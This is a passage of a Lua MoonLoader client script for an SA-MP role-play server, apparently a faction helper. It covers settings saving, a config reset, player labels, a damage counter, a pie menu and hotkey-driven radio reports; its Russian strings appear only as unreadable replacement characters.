											config_ini.UserBinder[6] = tostring(u8:decode(guibuffers.ubinds.bind6.v))
											config_ini.UserBinder[7] = tostring(u8:decode(guibuffers.ubinds.bind7.v))
											config_ini.UserBinder[8] = tostring(u8:decode(guibuffers.ubinds.bind8.v))
											config_ini.UserBinder[9] = tostring(u8:decode(guibuffers.ubinds.bind9.v))
											config_ini.UserBinder[10] = tostring(u8:decode(guibuffers.ubinds.bind10.v))
											config_ini.UserBinder[11] = tostring(u8:decode(guibuffers.ubinds.bind11.v))

											config_ini.UserCBinder[1] = tostring(u8:decode(guibuffers.ucbinds.bind1.v))
											config_ini.UserCBinder[2] = tostring(u8:decode(guibuffers.ucbinds.bind2.v))
											config_ini.UserCBinder[3] = tostring(u8:decode(guibuffers.ucbinds.bind3.v))
											config_ini.UserCBinder[4] = tostring(u8:decode(guibuffers.ucbinds.bind4.v))
											config_ini.UserCBinder[5] = tostring(u8:decode(guibuffers.ucbinds.bind5.v))
											config_ini.UserCBinder[6] = tostring(u8:decode(guibuffers.ucbinds.bind6.v))
											config_ini.UserCBinder[7] = tostring(u8:decode(guibuffers.ucbinds.bind7.v))
											config_ini.UserCBinder[8] = tostring(u8:decode(guibuffers.ucbinds.bind8.v))
											config_ini.UserCBinder[9] = tostring(u8:decode(guibuffers.ucbinds.bind9.v))
											config_ini.UserCBinder[10] = tostring(u8:decode(guibuffers.ucbinds.bind10.v))
											config_ini.UserCBinder[11] = tostring(u8:decode(guibuffers.ucbinds.bind11.v))
											config_ini.UserCBinder[12] = tostring(u8:decode(guibuffers.ucbinds.bind12.v))
											config_ini.UserCBinder[13] = tostring(u8:decode(guibuffers.ucbinds.bind13.v))
											config_ini.UserCBinder[14] = tostring(u8:decode(guibuffers.ucbinds.bind14.v))

											config_ini.UserCBinderC[1] = tostring(u8:decode(guibuffers.ucbindsc.bind1.v))
											config_ini.UserCBinderC[2] = tostring(u8:decode(guibuffers.ucbindsc.bind2.v))
											config_ini.UserCBinderC[3] = tostring(u8:decode(guibuffers.ucbindsc.bind3.v))
											config_ini.UserCBinderC[4] = tostring(u8:decode(guibuffers.ucbindsc.bind4.v))
											config_ini.UserCBinderC[5] = tostring(u8:decode(guibuffers.ucbindsc.bind5.v))
											config_ini.UserCBinderC[6] = tostring(u8:decode(guibuffers.ucbindsc.bind6.v))
											config_ini.UserCBinderC[7] = tostring(u8:decode(guibuffers.ucbindsc.bind7.v))
											config_ini.UserCBinderC[8] = tostring(u8:decode(guibuffers.ucbindsc.bind8.v))
											config_ini.UserCBinderC[9] = tostring(u8:decode(guibuffers.ucbindsc.bind9.v))
											config_ini.UserCBinderC[10] = tostring(u8:decode(guibuffers.ucbindsc.bind10.v))
											config_ini.UserCBinderC[11] = tostring(u8:decode(guibuffers.ucbindsc.bind11.v))
											config_ini.UserCBinderC[12] = tostring(u8:decode(guibuffers.ucbindsc.bind12.v))
											config_ini.UserCBinderC[13] = tostring(u8:decode(guibuffers.ucbindsc.bind13.v))
											config_ini.UserCBinderC[14] = tostring(u8:decode(guibuffers.ucbindsc.bind14.v))

											config_ini.rphr[1] = tostring(u8:decode(guibuffers.rphr.bind1.v))
											config_ini.rphr[2] = tostring(u8:decode(guibuffers.rphr.bind2.v))
											config_ini.rphr[3] = tostring(u8:decode(guibuffers.rphr.bind3.v))
											config_ini.rphr[4] = tostring(u8:decode(guibuffers.rphr.bind4.v))
											config_ini.rphr[5] = tostring(u8:decode(guibuffers.rphr.bind5.v))
											config_ini.rphr[6] = tostring(u8:decode(guibuffers.rphr.bind6.v))
											config_ini.rphr[7] = tostring(u8:decode(guibuffers.rphr.bind7.v))
											config_ini.rphr[8] = tostring(u8:decode(guibuffers.rphr.bind8.v))
											config_ini.rphr[9] = tostring(u8:decode(guibuffers.rphr.bind9.v))
											config_ini.rphr[10] = tostring(u8:decode(guibuffers.rphr.bind10.v))

											config_ini.Commands[1] = tostring(u8:decode(guibuffers.commands.command1.v))
											config_ini.Commands[2] = tostring(u8:decode(guibuffers.commands.command2.v))
											config_ini.Commands[3] = tostring(u8:decode(guibuffers.commands.command3.v))
											config_ini.Commands[4] = tostring(u8:decode(guibuffers.commands.command4.v))
											config_ini.Commands[5] = tostring(u8:decode(guibuffers.commands.command5.v))
											config_ini.Commands[6] = tostring(u8:decode(guibuffers.commands.command6.v))
											config_ini.Commands[7] = tostring(u8:decode(guibuffers.commands.command7.v))
											--config_ini.Commands[8] = tostring(u8:decode(guibuffers.commands.command8.v))
											config_ini.Commands[9] = tostring(u8:decode(guibuffers.commands.command9.v))
											config_ini.Commands[10] = tostring(u8:decode(guibuffers.commands.command10.v))
											config_ini.Commands[11] = tostring(u8:decode(guibuffers.commands.command11.v))
											config_ini.Commands[12] = tostring(u8:decode(guibuffers.commands.command12.v))
											config_ini.Commands[13] = tostring(u8:decode(guibuffers.commands.command13.v))
											config_ini.Commands[14] = tostring(u8:decode(guibuffers.commands.command14.v))
											config_ini.Commands[15] = tostring(u8:decode(guibuffers.commands.command15.v))
											config_ini.Commands[16] = tostring(u8:decode(guibuffers.commands.command16.v))
											config_ini.Commands[17] = tostring(u8:decode(guibuffers.commands.command17.v))
											config_ini.Commands[18] = tostring(u8:decode(guibuffers.commands.command18.v))
											config_ini.Commands[19] = tostring(u8:decode(guibuffers.commands.command19.v))
											config_ini.Commands[20] = tostring(u8:decode(guibuffers.commands.command20.v))
											config_ini.Commands[21] = tostring(u8:decode(guibuffers.commands.command21.v))
											config_ini.Commands[22] = tostring(u8:decode(guibuffers.commands.command22.v))
											--config_ini.Commands[23] = tostring(u8:decode(guibuffers.commands.command23.v))
											--config_ini.Commands[24] = tostring(u8:decode(guibuffers.commands.command24.v))
											config_ini.Commands[25] = tostring(u8:decode(guibuffers.commands.command25.v))
											--config_ini.Commands[26] = tostring(u8:decode(guibuffers.commands.command26.v))
											config_ini.Commands[27] = tostring(u8:decode(guibuffers.commands.command27.v))
											config_ini.Commands[28] = tostring(u8:decode(guibuffers.commands.command28.v))
											--config_ini.Commands[29] = tostring(u8:decode(guibuffers.commands.command29.v))

											config_ini.Settings.PlayerFirstName = tostring(u8:decode(guibuffers.settings.fname.v))
											config_ini.Settings.PlayerSecondName = tostring(u8:decode(guibuffers.settings.sname.v))
											config_ini.Settings.PlayerRank = tostring(u8:decode(guibuffers.settings.rank.v))
											config_ini.Settings.timep = tostring(u8:decode(guibuffers.settings.timep.v))
											config_ini.Settings.PlayerU = tostring(u8:decode(guibuffers.settings.PlayerU.v))
											config_ini.Settings.useclist = tostring(u8:decode(guibuffers.settings.useclist.v))
											config_ini.Settings.tag = tostring(u8:decode(guibuffers.settings.tag.v))										
											PlayerU = config_ini.Settings.PlayerU
											useclist = config_ini.Settings.useclist
											tag = config_ini.Settings.tag

											config_ini.warnings[1] = tostring(u8:decode(guibuffers.warnings.war1.v))
											config_ini.warnings[2] = tostring(u8:decode(guibuffers.warnings.war2.v))
											config_ini.warnings[3] = tostring(u8:decode(guibuffers.warnings.war3.v))
											config_ini.warnings[4] = tostring(u8:decode(guibuffers.warnings.war4.v))

											config_ini.UserPieMenuNames[1] = tostring(u8:decode(guibuffers.UserPieMenu.names.name1.v))
											config_ini.UserPieMenuNames[2] = tostring(u8:decode(guibuffers.UserPieMenu.names.name2.v))
											config_ini.UserPieMenuNames[3] = tostring(u8:decode(guibuffers.UserPieMenu.names.name3.v))
											config_ini.UserPieMenuNames[4] = tostring(u8:decode(guibuffers.UserPieMenu.names.name4.v))
											config_ini.UserPieMenuNames[5] = tostring(u8:decode(guibuffers.UserPieMenu.names.name5.v))
											config_ini.UserPieMenuNames[6] = tostring(u8:decode(guibuffers.UserPieMenu.names.name6.v))
											config_ini.UserPieMenuNames[7] = tostring(u8:decode(guibuffers.UserPieMenu.names.name7.v))
											config_ini.UserPieMenuNames[8] = tostring(u8:decode(guibuffers.UserPieMenu.names.name8.v))
											config_ini.UserPieMenuNames[9] = tostring(u8:decode(guibuffers.UserPieMenu.names.name9.v))
											config_ini.UserPieMenuNames[10] = tostring(u8:decode(guibuffers.UserPieMenu.names.name10.v))

											config_ini.UserPieMenuActions[1] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action1.v))
											config_ini.UserPieMenuActions[2] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action2.v))
											config_ini.UserPieMenuActions[3] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action3.v))
											config_ini.UserPieMenuActions[4] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action4.v))
											config_ini.UserPieMenuActions[5] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action5.v))
											config_ini.UserPieMenuActions[6] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action6.v))
											config_ini.UserPieMenuActions[7] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action7.v))
											config_ini.UserPieMenuActions[8] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action8.v))
											config_ini.UserPieMenuActions[9] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action9.v))
											config_ini.UserPieMenuActions[10] = tostring(u8:decode(guibuffers.UserPieMenu.actions.action10.v))
											
											config_ini.plus500[1] = tostring(u8:decode(guibuffers.plus500.plus500color.v))
											config_ini.plus500[2] = tostring(u8:decode(guibuffers.plus500.plus500size.v))
											config_ini.plus500[3] = tostring(u8:decode(guibuffers.plus500.plus500font.v))
											
											config_ini.squadset[1] = tostring(u8:decode(guibuffers.squad.fscolor.v))
											config_ini.squadset[2] = tostring(u8:decode(guibuffers.squad.size.v))
											config_ini.squadset[3] = tostring(u8:decode(guibuffers.squad.font.v))

											config_ini.fondset[1] = tostring(u8:decode(guibuffers.fond.fondcolor.v))
											config_ini.fondset[2] = tostring(u8:decode(guibuffers.fond.mycolor.v))

											config_ini.dial[1] = tostring(u8:decode(guibuffers.dial.med.v))
											config_ini.dial[2] = tostring(u8:decode(guibuffers.dial.rem.v))
											config_ini.dial[3] = tostring(u8:decode(guibuffers.dial.meh.v))
											config_ini.dial[4] = tostring(u8:decode(guibuffers.dial.azs.v))
											
											inicfg.save(config_ini, "config")
											sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}��������� ���� ������� ���������", 0xFFFF0000)
											needtosave = false
									end
							)
					end

					if needtoreset then
							os.remove("Moonloader\\config\\config.ini")
							sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}��������� ���� ������� ��������. ������� ����������...", 0xFFFF0000)
							needtoreset = false
							wait(0)
							thisScript():reload()
					end
					
					if config_ini.bools[35] == 1 and memb_ini ~= nil then
						for i = 0, 1000 do 
							if sampIsPlayerConnected(i) and memb_ini.players[sampGetPlayerNickname(i)] ~= nil then
								if not sampIs3dTextDefined(2048 - i) then
									local color = 0xffFFFAFA
									--if (memb_ini.players[sampGetPlayerNickname(i)] == "�����" or memb_ini.players[sampGetPlayerNickname(i)] == "������������" or memb_ini.players[sampGetPlayerNickname(i)] == "���������" or memb_ini.players[sampGetPlayerNickname(i)] == "�������") then print("tut") color = 0x0000BFFF end
									sampCreate3dTextEx(2048 - i, memb_ini.players[sampGetPlayerNickname(i)], color, 0, 0, 0.4, 22, false, i, -1)
								end
							end
						end
					end
					
					if needtohold and not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() and (wasKeyPressed(vkeys.VK_W) or wasKeyPressed(vkeys.VK_S)) then needtohold = false end

					-- ��������� ������� �� ������� (�� ��� ��� �������� ����� ������ ����� �����)
					if time then setTimeOfDay(time, 0) end

					if SetMode then
							if isKeyDown(vkeys.VK_MBUTTON) then
									wait(300)
									if isKeyDown(vkeys.VK_MBUTTON) then
											config_ini.ovCoords.show_timeX, config_ini.ovCoords.show_timeY = 10, 10
											config_ini.ovCoords.show_placeX, config_ini.ovCoords.show_placeY = 10, 10
											config_ini.ovCoords.show_nameX, config_ini.ovCoords.show_nameY = 10, 10
											if isCharInAnyCar(PLAYER_PED) then config_ini.ovCoords.show_vehX, config_ini.ovCoords.show_vehY = 10, 10 end
											config_ini.ovCoords.show_hpX, config_ini.ovCoords.show_hpY = 10, 10
											config_ini.ovCoords.crosCarX, config_ini.ovCoords.crosCarY = 10, 10
											config_ini.ovCoords.show_targetImageX, config_ini.ovCoords.show_targetImageY = 10, 10
											config_ini.ovCoords.show_rkX, config_ini.show_rkY = 10, 10
											config_ini.ovCoords.show_afkX, config_ini.show_afkY = 10, 10
											config_ini.ovCoords.show_tecinfoX, config_ini.show_tecinfoY = 10, 10
											config_ini.ovCoords.show_squadX, config_ini.ovCoords.show_squadY = 10, 10
											config_ini.ovCoords.show_500X, config_ini.ovCoords.show_500Y = 10, 10
											config_ini.ovCoords.show_dindX, config_ini.ovCoords.show_dindY = 10, 10
											config_ini.ovCoords.show_moneyX, config_ini.ovCoords.show_moneyY = 10, 10
											SetMode, SetModeFirstShow = true, true
											sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}���������� ��������� ���� ������� ��������", 0xFFFF0000)
									end
							end
					end

					-- ���������� � ��������������
					if config_ini.bools[57] == 1 then local weapid = tonumber(getCurrentCharWeapon(PLAYER_PED)) if autopred.current_weapon ~= weapid then autopred.current_weapon = weapid autopred.firstshot = false end end
						-- ��������� Pie Menu
					if isKeyDown(makeHotKey(44)[1]) and piearr.action == 0 and not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then wait(0) piearr.pie_mode.v = true imgui.ShowCursor = true else wait(0) piearr.pie_mode.v = false imgui.ShowCursor = false end


					-- �������� �� ������ � Pie Menu
					if piearr.action ~= 0 then
							local SB = formatbind(config_ini.UserPieMenuActions[piearr.action])
							if SB ~= nil then for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end end
							piearr.action = 0
					end

					if getCharHealth(PLAYER_PED) == 0 and (show.show_dmind.damind.hits[1] ~= 0 or show.show_dmind.damind.shots[1] ~= 0 or show.show_dmind.damind.damage[1] ~= 0) and config_ini.bools[44] == 1 then
						local acc = (show.show_dmind.damind.hits[1] == 0 or show.show_dmind.damind.shots[1] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[1] / (show.show_dmind.damind.shots[1] / 100))
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ���� ��������: {ff0000}" .. math.ceil(show.show_dmind.damind.damage[1]) .. ", {fffafa}� ��������: {ff0000}" .. acc .. " {fffafa}���������.", 0xFFFF0000)
						show.show_dmind.damind.shots = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}
						show.show_dmind.damind.hits = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}
						show.show_dmind.damind.damage = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}

					end
			end
end

function cmd_mon()
	if not isCharInAnyCar(PLAYER_PED) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ���� � ���������.", 0xFFFF0000) return end
	local idc = getCarModel(storeCarCharIsInNoSave(PLAYER_PED))
	if idc ~= 433 then 	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ���� � ���������.", 0xFFFF0000) return end

	skipd[3][5] = true
	skipd[3][8][1] = true
	sampSendChat("/carm")
end

function cmd_toggle()
	skipd[1].obool = not skipd[1].obool
	sampAddChatMessage(skipd[1].obool and "{FF0000}[LUA]: {FFFAFA}������� ������� �������." or "{FF0000}[LUA]: {FFFAFA}������� ������� ��������.", 0xFFFF0000)
end

function cmd_scr(sparams)
	if sparams ~= "exit" then sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}������� /scr exit ��� ���������� �������.", 0xFFFF0000) return end
	
	thisScript():unload()	
end

function cmd_dclean()
	local acc = (show.show_dmind.damind.hits[1] == 0 or show.show_dmind.damind.shots[1] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[1] / (show.show_dmind.damind.shots[1] / 100))
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ���� ��������: {ff0000}" .. math.ceil(show.show_dmind.damind.damage[1]) .. ", {fffafa}� ��������: {ff0000}" .. acc .. " {fffafa}���������.", 0xFFFF0000)
	show.show_dmind.damind.shots = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}
	show.show_dmind.damind.hits = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}
	show.show_dmind.damind.damage = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}
end

function cmd_s()
		lua_thread.create(
				function()
						for k, v in ipairs(config_ini.HotKey) do local hk = makeHotKey(k) if hk[1] ~= 0 then rkeys.unRegisterHotKey(hk) end end

						for k, v in ipairs(config_ini.Commands) do sampUnregisterChatCommand(v) end

						for k, v in ipairs(config_ini.UserCBinderC) do sampUnregisterChatCommand(v) end

						sampUnregisterChatCommand("commandhelp")
						sampUnregisterChatCommand("bugreport")
						sampUnregisterChatCommand("mkv")
						sampUnregisterChatCommand("bkv")
						sampUnregisterChatCommand("lej")
						sampUnregisterChatCommand("bp")
						sampUnregisterChatCommand("cars")

						if alevel > -1 then	sampUnregisterChatCommand("balogin") end
						if alevel > 0 then sampUnregisterChatCommand("check") sampUnregisterChatCommand ("lek") sampUnregisterChatCommand("pcheck") sampUnregisterChatCommand("tren") end
						if alevel > 1 then sampUnregisterChatCommand("padd") sampUnregisterChatCommand("pdel") sampUnregisterChatCommand("reg")	sampUnregisterChatCommand("ban") sampUnregisterChatCommand("add") sampUnregisterChatCommand("del") sampUnregisterChatCommand("change") sampUnregisterChatCommand("mark") end
						if alevel > 2 then sampUnregisterChatCommand("moder") sampUnregisterChatCommand("otm") sampUnregisterChatCommand("fond") end

						piearr.action = 0
						piearr.pie_mode.v = false -- ����� PieMenu
						piearr.pie_keyid = 0
						piearr.pie_elements = {}

						suspendkeys = 1
						guis.mainw.v = not guis.mainw.v
				end
		)
end

function cmd_duel(sparams)
	if sparams == "-1" then sampSendChat("/me ��������" .. RP .. " �� ��������� ��������") duel.mode = false duel.en.id = -1 return end
	local id = tonumber(sparams)
	local myid = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
	if id == nil or (id < 0 and id > 999) or not sampIsPlayerConnected(id) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
	if not sampGetCharHandleBySampPlayerId(id) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �� ������", 0xFFFF0000) return end
	local n, f = sampGetPlayerNickname(id):match("(.*)%_(.*)")
	sampSendChat("/me ������" .. RP .. " �������� ��� ���� " .. n .. " " .. f .. "")
	duel.mode = true
	duel.en.id = id
	--duel.en.hp = sampGetPlayerHealth(id)
	--duel.en.arm = sampGetPlayerArmor(id)
	--duel.my.hp = sampGetPlayerHealth(myid)
	--duel.my.arm = sampGetPlayerArmor(myid)
end

function cmd_piss()
	sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}������!", 0xFFFF0000)
end

function cmd_iznas()
	sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}������!", 0xFFFF0000)
end

function hk_1()
		lua_thread.create(
				function()
						sampSetChatInputEnabled(true)
						sampSetChatInputText("/f " .. tag .. " ")
						sampSendChat("/seedo ��������� ����� ������������")
				end
		)
end

function hk_2()
		sampSendChat("/f " .. tag .. " ��������! ��������� ������� �������� ���������! ������� �����!!!")
end

function hk_3()
		lua_thread.create(
				function()
						if not showdialog(1, "���� ��������", "{FFFAFA}[1] - ���������\n[2] - �������������\n[3] - ������� ������� � ��������\n[4] - ������� �������� � ��������\n[5] - �������� ��������� �� ����\n[6] - �������� �������������� � ���������� ����\n[7] - ������� ����/�������\n[0] - ������", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
						res = waitForChooseInDialog(1)
						if res == "" then sampSendChat("/f " .. tag .. " �������!") return end
						
						if not res or tonumber(res) == nil or (tonumber(res) < 0 or tonumber(res) > 7) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end

						if res == "1" then
								local zzz = {[1] = "��������� ������������", [2] = "��� �������� �������������", [3] = "��� �������� �������������", [4] = "������ �������� �������������", [5] = "���� ��������� �������������", [6] = "����� ��������� �������������", [7] = "���� ��������� �������������", [8] = "������ ��������� �������������", [9] = "������ ��������� �������������", [10] = "������ ��������� �������������"}

								if not showdialog(1, "���������", "���������� ���������. �� 1 �� 10.", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or tonumber(res) == nil or zzz[tonumber(res)] == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								local kol = tonumber(res)

								wait(0)
								if not showdialog(1, "���������", "������� �� �-1 �� �-24", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" or tonumber(res) == 0 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								local b, n = res:match("([�-�])-(%d+)")
								if b == nil or (tonumber(n) < 1 or tonumber(n) > 24) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������.", 0xFFFF0000) return end
								local kv = "" .. b .. "-" .. n .. ""

								wait(0)
								if not showdialog(1, "���������", "�������� ������?\n[1] - ��������(�) ������(�)\n[2] - �������� �� ������\n[3] - ��������� ��������� � ���� �������� ������", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or tonumber(res) == nil or tonumber(res) == 0 or (tonumber(res) < 0 or tonumber(res) > 3) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end

								local obdokl = "/f " .. tag .. " " .. zzz[kol] ..  ""
								local obdokl2 = iskv and " � �������� " .. kv .. "." or " ."
								local obdokl3
								if tonumber(res) == 2 then obdokl3 = "" elseif tonumber(res) == 3 or kol == 1 then obdokl3 = " �������� ������" elseif tonumber(res) == 1 and kol > 1 then obdokl3 = " ��������� �������" end
								local dokl = obdokl .. obdokl2 .. obdokl3
								sampSendChat(dokl)
						end

						if res == "2" then
								if not showdialog(1, "������� ����� ����������", "[1] - Los-Santos Police Department\n[2] - San-Fierro Police Department\n[3] - Las-Venturas Police Departmen\n[4] - Federal Bureau of Investigation\n[5] - San-Fierro Army\n[6] - San-Fierro\n[0] - ����� (������� 0)", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 6)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								if tonumber(res) == 0 then sampSendChat("/f " .. tag .. " ������� � ������������� ���") return end
								local arr = {
										["1"] = "Police LS", ["ls"] = "Police LS", ["lspd"] = "Police LS", ["��"] = "Police LS", ["����"] = "Police LS",
										["2"] = "Police SF", ["sfpd"] = "Police SF", ["����"] = "Police SF",
										["3"] = "Police LV", ["lv"] = "Police LV", ["lvpd"] = "Police LV", ["��"] = "Police LV", ["����"] = "Police LV",
										["4"] = "FBI", ["fbi"] = "FBI", ["���"] = "FBI",
										["5"] = "Army SF", ["sfa"] = "Army SF", ["���"] = "Army SF",
										["6"] = "�. San-Fierro", ["sf"] = "�. San-Fierro", ["��"] = "�. San-Fierro"
								}

								if arr[res] ~= nil then sampSendChat("/f " .. tag .. " ������� � ������������� ��� �� " .. arr[res] .. "") else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������.", 0xFFFF0000) end
						end

						if res == "3" then
								if not showdialog(1, "������� ����� ����������", "[1] - Los-Santos Police Department\n[2] - San-Fierro Police Department\n[3] - Las-Venturas Police Departmen\n[4] - Federal Bureau of Investigation\n[5] - San-Fierro Army\n[6] - San-Fierro\n[0] - ����� (������� 0)", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 6)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								if tonumber(res) == 0 then sampSendChat("/f " .. tag .. " ������� �������, ������������.") return end
								local arr = {
										["1"] = "Police LS", ["ls"] = "Police LS", ["lspd"] = "Police LS", ["��"] = "Police LS", ["����"] = "Police LS",
										["2"] = "Police SF", ["sfpd"] = "Police SF", ["����"] = "Police SF",
										["3"] = "Police LV", ["lv"] = "Police LV", ["lvpd"] = "Police LV", ["��"] = "Police LV", ["����"] = "Police LV",
										["4"] = "FBI", ["fbi"] = "FBI", ["���"] = "FBI",
										["5"] = "Army SF", ["sfa"] = "Army SF", ["���"] = "Army SF",
										["6"] = "�. San-Fierro", ["sf"] = "�. San-Fierro", ["��"] = "�. San-Fierro"
								}

								local kv = kvadrat()
								if arr[res] ~= nil then sampSendChat("/f " .. tag .. " ������� ������� � �������� " .. kv .. ", ������������ �� " .. arr[res] .. "") else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������.", 0xFFFF0000) end
						end

						if res == "4" then
								if not showdialog(1, "���� �����(������� �����)", "\n[0] - �����\n[1] - ����\n[2] - Las-Venturas Police Department\n[3] - Los-Santos Police Department\n[4] - San-Fierro Police Department\n[5] - San-Fierro Army\n[6] - Federal Bureau of Investigation\n[7] - San-Fierro", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 7)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								local kv = kvadrat()
								if tonumber(res) == 0 then lastKV.m = kv sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������� " .. lastKV.m .. ".", 0xFFFF0000) sampSendChat("/f " .. tag .. " ������� ��������, ����� ������") return end
								local arr = {
										["1"] = "�� ����", ["lva"] = "�� ����", ["���"] = "�� ����",
										["2"] = "� Police LV", ["lv"] = "� Police LV", ["lvpd"] = "� Police LV", ["��"] = "� Police LV", ["����"] = "� Police LV",
										["3"] = "� Police LS", ["ls"] = "� Police LS", ["lspd"] = "� Police LS", ["��"] = "� Police LS", ["����"] = "� Police LS",
										["4"] = "� Police SF", ["sfpd"] = "� Police SF", ["����"] = "� Police SF",
										["5"] = "� Army SF", ["sfa"] = "� Army SF", ["���"] = "� Army SF",
										["6"] = "� FBI", ["fbi"] = "� FBI", ["���"] = "� FBI",
										["7"] = "� �. San-Fierro", ["sf"] = "� �. San-Fierro", ["��"] = "� �. San-Fierro"
								}


								if arr[res] ~= nil then
										lastKV.m = kv
										sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������� " .. lastKV.m .. ".", 0xFFFF0000)
										sampSendChat("/f " .. tag .. " ������� �������� � �������� " .. kv .. ", ����� " .. arr[res] .. "")
								else
										sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������.", 0xFFFF0000)
								end
						end

						if res == "5" then
								if lastKV.m ~= "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}� ��������� ��� �� �������� �������� � �������� " .. lastKV.m .. ".", 0xFFFF0000) lastKV.m = "none" end
								if not showdialog(1, "������ ���������", "������� �� �-1 �� �-24", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								local b, n = res:match("([�-�])-(%d+)")
								if b == nil or (tonumber(n) < 1 or tonumber(n) > 24) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������.", 0xFFFF0000) return end
								local kv = "" .. b .. "-" .. n .. ""
								sampSendChat("/f " .. tag .. " �������� � �������� " .. kv .. " ��������� �� ����")
						end

						if res == "6" then
								if not showdialog(1, "���� �����(������� �����)", "\n[0] - �����\n[1] - ����\n[2] - Las-Venturas Police Department\n[3] - Los-Santos Police Department\n[4] - San-Fierro Police Department\n[5] - San-Fierro Army\n[6] - Federal Bureau of Investigation\n[7] - San-Fierro", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 7)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								if tonumber(res) == 0 then sampSendChat("/f " .. tag .. " �������� �������������� � ���������� ����") return end
								local arr = {
										["1"] = "�� ����", ["lva"] = "�� ����", ["���"] = "�� ����",
										["2"] = "� Police LS", ["ls"] = "� Police LS", ["lspd"] = "� Police LS", ["��"] = "� Police LS", ["����"] = "� Police LS",
										["3"] = "� Police SF", ["sfpd"] = "� Police SF", ["����"] = "� Police SF",
